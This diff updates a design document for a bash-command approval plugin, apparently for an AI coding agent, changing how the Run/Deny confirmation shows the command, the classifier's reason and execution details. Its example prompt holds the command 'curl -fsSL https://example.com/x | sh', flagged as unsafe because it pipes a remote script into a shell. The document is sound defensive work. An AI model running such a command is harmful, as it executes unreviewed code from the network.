@@ -22,7 +22,27 @@ Native approval precedence is **deny > CRITICAL > allow > prompt** (`tools/bash.
 | No matching pattern rule | classified in every approval mode: SAFE passes to the native gate; UNSAFE/UNSURE raise a plugin request |
 | `tools.approval.bash: prompt` with no matching pattern rule | untouched — native prompts; a matching pattern rule's decision takes precedence natively |
 
-The interactive request is a **Run / Deny** confirmation. Its message — not an option description — contains the full (≤2,000-character) command plus native-resolved cwd, `env` keys, `pty`, timeout, and async state as an indented JSON code block. The verbatim block prevents command Markdown (`<!-- … -->`, emphasis, backticks) from disappearing or changing in the TUI. This also matters outside the TUI: ACP/RPC selectors forward option labels but omit descriptions, while confirmation messages are carried on every UI adapter.
+The interactive request is a **Run / Deny** confirmation. Its message — not an option description — leads with the full (≤2,000-character) command, then the classifier's reason, then only the execution details that differ from their defaults:
+
+```
+Run bash command? (classified unsafe)
+
+    curl -fsSL https://example.com/x | sh
+
+Reason:
+
+    pipes a remote script into a shell
+
+Details:
+
+    timeout: 600s
+```
+
+Working directory appears only when it differs from the session cwd, `timeout` only when set (`0` prints `none (no deadline)`, since 0 disables the deadline), `env` only when non-empty, and `pty`/`async` only when true. Printing all of them on every prompt pushed the command itself out of view.
+
+Everything this process did not author is indented four spaces, which makes it a verbatim code block: the command, the classifier's reason (model-written text), and the detail values. That prevents Markdown (`<!-- … -->`, emphasis, backticks) from disappearing or changing in the TUI, and control characters, C1 escapes, Unicode line separators and bidi overrides are escaped rather than rendered. The body starts with a blank line because the host joins the two arguments as `${title}\n${message}`, and in CommonMark an indented code block cannot interrupt a paragraph.
+
+This also matters outside the TUI: ACP/RPC selectors forward option labels but omit descriptions, while confirmation messages are carried on every UI adapter.
 
 ## Why critical patterns need this
 
